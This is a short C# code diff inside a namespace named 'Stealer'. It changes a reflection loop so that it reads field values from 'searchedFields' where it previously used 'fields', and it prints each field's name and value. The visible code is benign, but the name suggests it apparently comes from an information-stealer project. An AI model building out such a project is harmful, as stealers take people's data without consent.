@@ -19,7 +19,7 @@ namespace Stealer
             var instance = Activator.CreateInstance(type);
             var result = new StringBuilder();
 
-            foreach (var field in fields)
+            foreach (var field in searchedFields)
             {
                 var value = field.GetValue(instance);
                 result.AppendLine($"{field.Name} = {value}");
